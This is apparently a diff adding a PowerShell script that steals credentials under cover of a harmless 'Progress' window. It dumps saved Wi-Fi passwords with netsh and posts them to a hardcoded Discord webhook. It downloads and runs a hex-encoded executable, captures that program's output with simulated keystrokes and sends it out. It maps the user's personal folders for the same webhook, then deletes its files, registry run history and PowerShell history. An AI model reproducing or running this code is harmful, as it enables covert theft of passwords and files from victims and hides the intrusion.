@@ -1,0 +1,317 @@
+# Discord webhook URL
+$webhookUrl = 'https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+
+# ##############################################################################
+
+# Redirect both standard output and error to null
+$null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
+
+###############################################################################
+
+# Load the WPF assembly
+Add-Type -AssemblyName PresentationFramework
+
+# Create a new WPF window
+$window = New-Object System.Windows.Window
+$window.Title = "Progress"
+$window.Width = 300
+$window.Height = 100
+$window.Topmost = $true # Keep it on top
+
+# Create a ProgressBar
+$progressBar = New-Object System.Windows.Controls.ProgressBar
+$progressBar.IsIndeterminate = $false
+$progressBar.Maximum = 100
+$progressBar.Value = 0
+$progressBar.Width = 250
+$progressBar.Height = 30
+$progressBar.Margin = New-Object System.Windows.Thickness(10)
+
+# Add ProgressBar to the Window
+$window.Content = $progressBar
+
+# Show the window
+$window.Show()
+
+# Define the total number of tasks (replace with the number of main operations)
+$totalSteps = 5  # Adjust this to the number of main operations you want to track
+
+# Example operations (replace with your actual code)
+for ($step = 1; $step -le $totalSteps; $step++) {
+    # Perform your operation here
+    switch ($step) {
+        1 {
+            # Operation 1 - Extract Wi-Fi profiles
+            try {
+                netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+                    $wlan = $_.Matches.Value
+                    
+                    # Extract the Wi-Fi password
+                    try {
+                        $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+                    } catch {
+                        #Write-Host "Failed to retrieve password for $wlan"
+                        $passw = "N/A" # Assign a placeholder if password retrieval fails
+                    }
+            
+                    # Build the message body for the webhook
+                    $Body = @{
+                        'username' = $env:username + " | " + [string]$wlan
+                        'content'  = [string]$passw
+                    }
+            
+                    # Send the data to the Discord webhook
+                    try {
+                        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction SilentlyContinue | Out-Null
+                    } catch {
+                        #Write-Host "Failed to send data to Discord webhook"
+                    }
+                }
+                # Add-Type -AssemblyName PresentationFramework
+                # [System.Windows.MessageBox]::Show('Netsh checked!', 'Notification')
+            } catch {
+                #Write-Host "An error occurred: $($_.Exception.Message)"
+                Add-Type -AssemblyName PresentationFramework
+                [System.Windows.MessageBox]::Show("An error occurred: $($_.Exception.Message)", 'Error')
+            }
+
+            # Write-Output "Completed Operation 1 - NETSH"
+        }
+        2 {
+            # Operation 2
+            $url = "https://lnkfwd.com/u/Kpj_Yric"  # Define the URL of the file to be downloaded
+            $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
+            Invoke-WebRequest -Uri $url -OutFile $tempPath # Use Invoke-WebRequest to download the file
+
+            ###############################################################################
+
+            # OPEN THE PROGRAM BY CONVERTING HEX TO EXE AND RUN IN THE MEMORY
+
+            $hexFilePath = Join-Path $env:TEMP "example.txt" # Path to the hex file in the %temp% directory
+            $hexString = Get-Content -Path $hexFilePath -Raw # Read the hex string from the file
+
+            # Convert the hex string to a byte array
+            $bytes = [byte[]]::new($hexString.Length / 2)
+            for ($i = 0; $i -lt $hexString.Length; $i += 2) {
+                $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
+            }
+
+            # Create a temporary file to hold the executable
+            $tempExePath = Join-Path $env:TEMP "example.exe"
+            [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
+
+            $process = Start-Process $tempExePath # Start the executable
+
+            # Write-Output "Completed Operation 2"
+        }
+        3 {
+            # Operation 3 - EXTRACT DATA 
+
+            $outputFilePath = "$env:TEMP\data.txt"
+            Start-Sleep -Seconds 2 # Wait a moment for the application to fully load
+            Add-Type -AssemblyName System.Windows.Forms # Load the necessary assemblies for sending keys
+
+            # Simulate CTRL+A and then CTRL+S to save the file
+            [System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
+            Start-Sleep -Milliseconds 500  # Wait a moment for selection
+            [System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
+            Start-Sleep -Milliseconds 1000  # Wait for save dialog to appear
+
+            # Send the output file path and Enter
+            [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
+            Start-Sleep -Milliseconds 500  # Wait for the input
+            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save
+
+            Start-Sleep -Seconds 2 # Wait a moment for the file to save
+            Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
+
+            # Write-Output "Completed Operation 3 - EXTRACT DATA"
+        }
+        4 {
+            # Operation 4 - SEND TO DISCORD
+
+            $filePath = "$env:TEMP\data.txt" # Define the path to the text file using the TEMP environment variable
+
+            # Check if the file exists
+            if (Test-Path $filePath) {
+                # Read the content of the text file
+                $fileContent = Get-Content -Path $filePath -Raw
+
+                # Split the content into chunks of 2000 characters
+                $chunkSize = 2000
+                $chunks = [System.Collections.Generic.List[string]]::new()
+
+                for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                    $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+                }
+
+                # Send each chunk to the Discord webhook
+                foreach ($chunk in $chunks) {
+                    # Create the payload for the webhook
+                    $payload = @{
+                        content = $chunk
+                    } | ConvertTo-Json
+
+                    # Try to send the content to the Discord webhook
+                    try {
+                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null
+                        Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                    } catch {
+                        #Write-Host "Error sending request: $_"
+                        Add-Type -AssemblyName PresentationFramework
+                        [System.Windows.MessageBox]::Show("Error sending request: $_", 'Error')
+                    }
+                }
+            } else {
+                #Write-Host "File not found: $filePath"
+                Add-Type -AssemblyName PresentationFramework
+                [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
+            }
+            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\Ain1_log.txt" -Force -ErrorAction SilentlyContinue
+
+            # Write-Output "Completed Operation 4 - CRED done"
+        }
+        5 {
+            #Operation 5 - TREE Files Extract
+            # Define the folders to search
+            $folders = @(
+                [System.IO.Path]::Combine($env:USERPROFILE, 'Desktop'),
+                [System.IO.Path]::Combine($env:USERPROFILE, 'Documents'),
+                [System.IO.Path]::Combine($env:USERPROFILE, 'Videos'),
+                [System.IO.Path]::Combine($env:USERPROFILE, 'Music')
+            )
+    
+            # Define the output file path
+            $outputFile = [System.IO.Path]::Combine($env:TEMP, 'tree.txt')
+    
+            # Function to display files in a tree structure
+            function Show-Tree {
+                param (
+                    [string]$Path,
+                    [int]$Depth = 0
+                )
+                
+                # Get all directories and files in the current path
+                $items = Get-ChildItem -Path $Path -ErrorAction SilentlyContinue
+    
+                foreach ($item in $items) {
+                    # Exclude Program Files and OS files
+                    if ($item.FullName -notlike "*\Program Files\*" -and 
+                        $item.FullName -notlike "*\Windows\*" -and 
+                        $item.FullName -notlike "*\System32\*") {
+    
+                        # Indent based on depth
+                        $indent = ' ' * ($Depth * 4)
+    
+                        # Display the item
+                        if ($item.PSIsContainer) {
+                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
+                            # Recurse into the directory
+                            Show-Tree -Path $item.FullName -Depth ($Depth + 1)
+                        } else {
+                            "${indent}+-- $($item.Name)" | Out-File -Append -FilePath $outputFile
+                        }
+                    }
+                }
+            }
+    
+            # Clear the output file if it already exists
+            if (Test-Path $outputFile) {
+                Remove-Item $outputFile
+            }
+    
+            # Iterate through defined folders and display their contents
+            foreach ($folder in $folders) {
+                "Contents of ${folder}:" | Out-File -Append -FilePath $outputFile
+                Show-Tree -Path $folder
+                "" | Out-File -Append -FilePath $outputFile
+            }
+    
+            #########################################################################
+    
+            # Define the webhook URL
+            $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+    
+            # Define the path to the text file using the TEMP environment variable
+            $filePath = "$env:TEMP\tree.txt"
+    
+            # Check if the file exists
+            if (Test-Path $filePath) {
+                # Read the content of the text file
+                $fileContent = Get-Content -Path $filePath -Raw
+    
+                # Check the length of the file content
+                if ($fileContent.Length -lt 2000) {
+                    # Send the entire content to the Discord webhook
+                    $payload = @{
+                        content = $fileContent
+                    } | ConvertTo-Json
+                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                } else {
+                    # Split the content into chunks of 2000 characters
+                    $chunkSize = 2000
+                    $chunks = [System.Collections.Generic.List[string]]::new()
+    
+                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
+                        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
+                    }
+    
+                    # Send each chunk to the Discord webhook
+                    foreach ($chunk in $chunks) {
+                        # Create the payload for the webhook
+                        $payload = @{
+                            content = $chunk
+                        } | ConvertTo-Json
+    
+                        # Try to send the content to the Discord webhook
+                        try {
+                            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+                            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
+                        } catch {
+                            # Write-Host "Error sending request: $_"
+                        }
+                    }
+                }
+            } else {
+                # Write-Host "File not found: $filePath"
+                Add-Type -AssemblyName PresentationFramework
+            [System.Windows.MessageBox]::Show("File not found: $filePath", 'Notification')
+            }
+    
+            Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:TEMP\treewin.ps1" -Force -ErrorAction SilentlyContinue
+    
+            #delete the entire history
+            reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+    
+            # Clear the PowerShell command history
+            Clear-History
+    
+            # Display a message box indicating completion
+            # Add-Type -AssemblyName PresentationFramework
+            # [System.Windows.MessageBox]::Show('tree finish!', 'Notification')
+        }
+    }
+
+    # Update the progress bar
+    $progressBar.Value = ($step / $totalSteps) * 100
+
+    # Update the window to keep it responsive
+    [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([Action]{$null}, [System.Windows.Threading.DispatcherPriority]::Background)
+}
+
+# Close the window upon completion
+$window.Close()
+
+# End the transcript if you started one
+Stop-Transcript
+
+# Final output (if needed)
+# Write-Output "All operations completed!"
+# Display a message box indicating completion
+Add-Type -AssemblyName PresentationFramework
+[System.Windows.MessageBox]::Show('All operations completed!', 'Notification')
